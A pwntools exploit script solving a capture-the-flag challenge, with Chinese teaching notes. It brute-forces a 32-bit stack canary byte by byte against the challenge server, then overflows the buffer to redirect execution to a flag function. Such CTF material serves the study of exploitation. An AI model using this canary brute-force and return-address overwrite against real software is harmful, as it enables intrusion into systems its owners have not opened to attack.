from pwn import *

canary = b''
print(type(canary))

for i in range(4):
    for c in range(0xFF):
        p = remote('pwn.challenge.ctf.show', 28192)
        p.sendlineafter('>', '-1')
        offset = 0x20
        payload = b'a' * offset + canary + p8(c)
        p.sendafter('$ ', payload)
        # p.recv(1)
        response = p.recv()
        print(response.decode())
        if 'Canary Value Incorrect!' not in response.decode():
            canary = canary + p8(c)
            break
        p.close()

print('canary is: ', canary)

p = remote('pwn.challenge.ctf.show', 28192)

flag_addr = 0x8048696

payload = b'a' * 0x20 + canary + p32(0) * 4 + p32(flag_addr)

p.sendlineafter('>', '-1')
p.sendafter('$ ', payload)

p.interactive()

"""
【知识点讲解】
1. 题目类型：ret2text + Canary保护绕过
2. Canary保护机制：
   - 在ebp和返回地址之间插入一个随机值（canary）
   - 函数返回前检查canary是否被修改
   - 如果被修改，程序终止并报错
3. Canary爆破原理：
   - 32位程序，canary通常是4字节
   - 逐字节爆破，每次尝试0x00-0xFF
   - 如果程序没有报错，说明该字节正确
4. 爆破流程：
   - 第1轮：爆破第1字节，尝试0x00-0xFF
   - 第2轮：已知第1字节，爆破第2字节
   - 以此类推，直到4字节全部爆破完成
5. 关键代码解析：
   p8(c)：将整数c打包为1字节
   'Canary Value Incorrect!' in response：判断是否报错
6. 利用流程：
   - 爆破出完整canary
   - 构造payload：填充 + canary + 填充 + 返回地址
   - 覆盖返回地址为flag函数
7. 关键点：Canary逐字节爆破技术
"""
